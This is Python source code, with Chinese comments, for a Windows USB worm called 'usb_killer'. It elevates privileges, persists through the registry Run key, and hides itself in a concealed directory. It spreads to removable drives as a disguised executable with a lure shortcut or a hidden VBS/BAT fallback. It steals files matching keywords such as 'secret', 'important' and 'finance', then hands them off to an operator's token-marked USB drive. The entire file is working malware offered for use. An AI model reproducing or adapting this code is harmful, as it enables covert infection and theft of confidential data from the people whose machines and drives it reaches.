from psutil import disk_partitions
import shutil
import time, os, ctypes, winreg
import hashlib
import uuid
import sys
import tempfile
from ctypes import wintypes
from cryptography.fernet import Fernet

# ========== 配置部分 ==========
def get_target_dir():
    """获取目标目录，优先级：D盘 > AppData > 临时目录"""
    paths = [
        'D:\\usb_killer\\',
        os.path.join(os.environ['APPDATA'], 'usb_killer\\'),
        os.path.join(tempfile.gettempdir(), 'usb_killer\\')
    ]
    for path in paths:
        if os.path.exists(os.path.dirname(path)) and os.access(os.path.dirname(path), os.W_OK):
            return path
    return paths[-1]

# 全局配置
target_dir = get_target_dir()
REG_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
MAX_SIZE = 100 * 1024 * 1024  # 100MB限制
EXCLUDE_EXT = ['.iso', '.vhd', '.tmp']
SEARCH_KEYWORDS = ['机密', '重要', '财务']
DISGUISE_NAME = "资料库"
LOG_FILE = os.path.join(target_dir, 'log.txt')
ADMIN_TOKEN_FILE = os.path.join(target_dir, 'admin_token.dat')

# ========== 核心工具函数 ==========
class FileUtils:
    @staticmethod
    def set_hidden(path):
        """设置文件/目录为隐藏和系统属性"""
        try:
            FILE_ATTRIBUTE_HIDDEN = 0x02
            FILE_ATTRIBUTE_SYSTEM = 0x04
            ctypes.windll.kernel32.SetFileAttributesW(
                wintypes.LPCWSTR(path),
                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
            )
            return True
        except Exception as e:
            Logger.log(f"属性设置失败 {path}: {str(e)}")
            return False

    @staticmethod
    def get_hash(file_path):
        """计算文件MD5哈希"""
        try:
            hash_md5 = hashlib.md5()
            with open(file_path, "rb") as f:
                for chunk in iter(lambda: f.read(4096), b""):
                    hash_md5.update(chunk)
            return hash_md5.hexdigest()
        except Exception as e:
            Logger.log(f"哈希计算失败 {file_path}: {str(e)}")
            return None

    @staticmethod
    def create_dir(path):
        """安全创建目录并设置隐藏属性"""
        try:
            os.makedirs(path, exist_ok=True)
            FileUtils.set_hidden(path)
            return True
        except Exception as e:
            Logger.log(f"目录创建失败 {path}: {str(e)}")
            return False

class Logger:
    @staticmethod
    def log(message):
        """记录日志"""
        log_content = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}\n"
        FileUtils.create_dir(target_dir)
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(log_content)

class CryptoUtils:
    _cipher = None

    @classmethod
    def get_cipher(cls):
        """获取加密工具实例"""
        if cls._cipher is None:
            key_path = os.path.join(target_dir, 'crypto.key')
            if not os.path.exists(key_path):
                key = Fernet.generate_key()
                with open(key_path, 'wb') as f:
                    f.write(key)
            else:
                with open(key_path, 'rb') as f:
                    key = f.read()
            cls._cipher = Fernet(key)
        return cls._cipher

    @classmethod
    def encrypt(cls, data):
        """加密数据"""
        return cls.get_cipher().encrypt(data.encode())

    @classmethod
    def decrypt(cls, encrypted_data):
        """解密数据"""
        return cls.get_cipher().decrypt(encrypted_data).decode()

# ========== 主要功能类 ==========
class USBManager:
    @staticmethod
    def is_admin():
        """检查管理员权限"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    @staticmethod
    def check_new_usb():
        """检测新插入的U盘"""
        return [i.device for i in disk_partitions() if 'removable' in i.opts]

    @staticmethod
    def check_admin_marker(usb_path):
        """验证管理员U盘"""
        marker_path = os.path.join(usb_path, 'administrator.txt')
        if not os.path.exists(marker_path):
            return False
        
        try:
            with open(marker_path, 'r') as f:
                actual_token = f.read().strip()
            expected_token = CryptoUtils.decrypt(open(ADMIN_TOKEN_FILE, 'rb').read())
            return expected_token == actual_token
        except Exception as e:
            Logger.log(f"管理员验证失败: {str(e)}")
            return False

class AutoStartManager:
    @staticmethod
    def setup():
        """设置开机自启动"""
        try:
            exe_path = os.path.join(target_dir, "usb.exe")
            with winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER) as reg:
                with winreg.OpenKey(reg, REG_KEY, 0, winreg.KEY_WRITE) as key:
                    winreg.SetValueEx(key, "USBCopy", 0, winreg.REG_SZ, exe_path)
            return True
        except Exception as e:
            Logger.log(f"注册表错误: {str(e)}")
            return False

class SelfReplicator:
    @staticmethod
    def copy_self():
        """将自身复制到目标目录"""
        try:
            current_exe = sys.executable
            target_exe = os.path.join(target_dir, "usb.exe")
            
            if os.path.exists(target_exe):
                if FileUtils.get_hash(target_exe) == FileUtils.get_hash(current_exe):
                    return True
                    
            shutil.copy2(current_exe, target_exe)
            FileUtils.set_hidden(target_exe)
            Logger.log("程序已更新到目标目录")
            return True
        except Exception as e:
            Logger.log(f"自我复制失败: {str(e)}")
            return False

    @staticmethod
    def spread_to_usb(usb_path):
        """传播自身到U盘"""
        try:
            # 创建伪装文件夹
            original_folder = os.path.join(usb_path, DISGUISE_NAME)
            FileUtils.create_dir(original_folder)
            
            # 复制自身
            exe_path = os.path.join(usb_path, f"{DISGUISE_NAME}.exe")
            if os.path.exists(sys.executable):
                shutil.copy2(sys.executable, exe_path)
                FileUtils.set_hidden(exe_path)
                
                # 创建快捷方式
                USBManager.create_shortcut(
                    usb_path,
                    f"{DISGUISE_NAME}.lnk",
                    exe_path,
                    original_folder
                )
        except Exception as e:
            Logger.log(f"传播失败: {str(e)}")

    @staticmethod
    def create_shortcut(usb_path, link_name, exe_path, target_folder):
        """创建快捷方式"""
        try:
            from win32com.client import Dispatch
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(os.path.join(usb_path, link_name))
            shortcut.TargetPath = exe_path
            shortcut.Arguments = f'--open-dir "{target_folder}"'
            shortcut.IconLocation = os.path.join(os.environ['SYSTEMROOT'], 'system32', 'shell32.dll,3')
            shortcut.WindowStyle = 7  # 最小化窗口
            shortcut.Save()
            FileUtils.set_hidden(os.path.join(usb_path, link_name))
        except Exception as e:
            Logger.log(f"快捷方式创建失败: {str(e)}")
            # 回退到批处理方式
            SelfReplicator.create_autorun_script(usb_path)

    @staticmethod
    def create_autorun_script(usb_path):
        """创建自启动脚本"""
        bat_path = os.path.join(usb_path, "start.bat")
        vbs_path = os.path.join(usb_path, "start.vbs")
        
        bat_content = f'@echo off\nstart "" "{os.path.join(usb_path, DISGUISE_NAME)}"'
        vbs_content = f'Set ws = CreateObject("Wscript.Shell")\nws.run "cmd /c {bat_path}",vbhide'
        
        for path, content in [(bat_path, bat_content), (vbs_path, vbs_content)]:
            with open(path, 'w') as f:
                f.write(content)
            FileUtils.set_hidden(path)

class FileScanner:
    @staticmethod
    def scan_copy(path):
        """扫描并复制文件"""
        if USBManager.check_admin_marker(path):
            Logger.log(f"检测到管理员U盘: {path}，跳过扫描")
            return
        
        if not os.path.exists(path):
            return False
        
        for root, dirs, files in os.walk(path):
            # 跳过隐藏目录
            dirs[:] = [d for d in dirs if not d.startswith('.')]
            
            # 扫描目录
            for dir_name in dirs:
                dir_path = os.path.join(root, dir_name)
                if any(keyword in dir_name for keyword in SEARCH_KEYWORDS):
                    FileScanner.copy_item(dir_path)
            
            # 扫描文件
            for file in files:
                file_path = os.path.join(root, file)
                if (os.path.getsize(file_path) > MAX_SIZE or 
                    os.path.splitext(file)[1].lower() in EXCLUDE_EXT):
                    continue
                    
                if any(keyword in file for keyword in SEARCH_KEYWORDS):
                    FileScanner.copy_item(file_path)
                    continue
                
                if file.lower().endswith(('.txt', '.doc', '.docx', '.md')):
                    if FileScanner.check_keywords(file_path): 
                        FileScanner.copy_item(file_path)

    @staticmethod
    def check_keywords(file_path):
        """检查文件内容是否包含关键词"""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read(4096)
                return any(keyword in content for keyword in SEARCH_KEYWORDS)
        except Exception as e:
            Logger.log(f"文件内容检查失败 {file_path}: {str(e)}")
            return False

    @staticmethod
    def copy_item(src):
        """复制文件或文件夹"""
        try:
            dest = os.path.join(target_dir, os.path.basename(src))
            
            # 跳过相同文件
            if os.path.isfile(src) and os.path.exists(dest):
                if FileUtils.get_hash(src) == FileUtils.get_hash(dest):
                    Logger.log(f"跳过重复文件 {src}")
                    return
            
            if os.path.exists(dest):
                return
                
            if os.path.isfile(src):
                shutil.copy2(src, dest)
                Logger.log(f"已复制文件: {src} → {dest}")
            elif os.path.isdir(src):
                shutil.copytree(src, dest)
                Logger.log(f"已复制文件夹: {src} → {dest}")
                
        except Exception as e:
            Logger.log(f"复制失败 {src}: {str(e)}")

    @staticmethod
    def copy_to_admin_usb(usb_path):
        """将文件复制到管理员U盘"""
        try:
            target_path = os.path.join(usb_path, 'copy')
            if not os.path.exists(target_path):
                FileUtils.create_dir(target_path)
            
            for item in os.listdir(target_dir):
                src = os.path.join(target_dir, item)
                dest = os.path.join(target_path, item)
                
                if os.path.isfile(src):
                    shutil.copy2(src, dest)
                    Logger.log(f"反向复制文件: {src} → {dest}")
                elif os.path.isdir(src):
                    shutil.copytree(src, dest)
                    Logger.log(f"反向复制文件夹: {src} → {dest}")
        except Exception as e:
            Logger.log(f"管理员U盘复制失败: {str(e)}")

# ========== 主程序 ==========
def main():
    # 检查并提升权限
    if not USBManager.is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, sys.argv[0], None, 1)
        sys.exit()
    
    # 初始化目录
    FileUtils.create_dir(target_dir)
    
    # 生成并保存加密令牌
    if not os.path.exists(ADMIN_TOKEN_FILE):
        admin_token = str(uuid.uuid4())
        try:
            with open(ADMIN_TOKEN_FILE, 'wb') as f:
                f.write(CryptoUtils.encrypt(admin_token))
            
            marker_path = os.path.join(target_dir, 'administrator.txt')
            with open(marker_path, 'w') as f:
                f.write(admin_token)
            FileUtils.set_hidden(marker_path)
        except Exception as e:
            Logger.log(f"令牌初始化失败: {str(e)}")
    
    # 设置自启动
    AutoStartManager.setup()
    
    # 复制自身到目标目录
    SelfReplicator.copy_self()
    
    # 主循环
    current_usbs = []
    while True:
        time.sleep(3)
        detected_usbs = USBManager.check_new_usb()
        
        # 处理新设备
        for usb in [d for d in detected_usbs if d not in current_usbs]:
            Logger.log(f"发现新设备: {usb}")
            if USBManager.check_admin_marker(usb):
                Logger.log(f"管理员U盘 {usb} 已插入")
                FileScanner.copy_to_admin_usb(usb)
            else:
                SelfReplicator.spread_to_usb(usb)
                FileScanner.scan_copy(usb)
            Logger.log("处理完成")
        
        # 处理移除设备
        for usb in [d for d in current_usbs if d not in detected_usbs]:
            Logger.log(f"设备已移除: {usb}")
        
        current_usbs = detected_usbs.copy()
        time.sleep(2)

if __name__ == '__main__':
    main()